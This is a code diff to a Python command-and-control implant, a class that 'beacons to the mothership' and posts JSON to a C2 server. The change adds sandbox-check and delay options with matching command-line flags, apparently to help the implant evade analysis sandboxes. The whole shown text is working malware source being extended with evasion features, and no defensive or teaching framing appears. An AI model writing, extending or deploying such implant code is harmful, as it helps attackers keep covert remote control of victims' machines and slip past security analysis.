@@ -20,12 +20,15 @@ import uuid
 class Implant:
     """C2 agent that beacons to the mothership."""
 
-    def __init__(self, server_url: str, agent_id: str = None):
+    def __init__(self, server_url: str, agent_id: str = None,
+                 sandbox_check: bool = False, sandbox_delay: int = 0):
         self.server = server_url.rstrip("/")
         self.id = agent_id or str(uuid.uuid4())[:8]
         self.sleep = 5
         self.jitter = 20  # percentage
         self.running = True
+        self.sandbox_check = sandbox_check
+        self.sandbox_delay = sandbox_delay
 
     def _post(self, path: str, data: dict) -> dict:
         """POST JSON to the C2 server."""
@@ -215,5 +218,10 @@ class Implant:
 if __name__ == "__main__":
     import sys
     url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8037"
-    agent = Implant(url)
+    sandbox = "--sandbox" in sys.argv
+    delay = 0
+    for a in sys.argv:
+        if a.startswith("--delay="):
+            delay = int(a.split("=")[1])
+    agent = Implant(url, sandbox_check=sandbox, sandbox_delay=delay)
     agent.run()
